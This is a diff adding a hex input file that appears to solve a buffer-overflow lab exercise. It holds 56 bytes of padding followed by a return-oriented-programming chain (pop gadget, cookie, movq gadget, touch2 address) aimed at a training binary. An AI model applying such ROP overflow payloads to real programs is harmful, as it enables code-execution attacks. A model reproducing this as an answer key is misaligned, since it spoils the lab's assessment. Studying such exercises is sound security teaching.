@@ -1,0 +1,11 @@
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+90 1a 40 00 00 00 00 00 /* pop gadget */
+e7 de 6a 27 00 00 00 00 /* cookie */
+66 1a 40 00 00 00 00 00 /* movq gadget */
+b7 18 40 00 00 00 00 00 /* touch2 address */
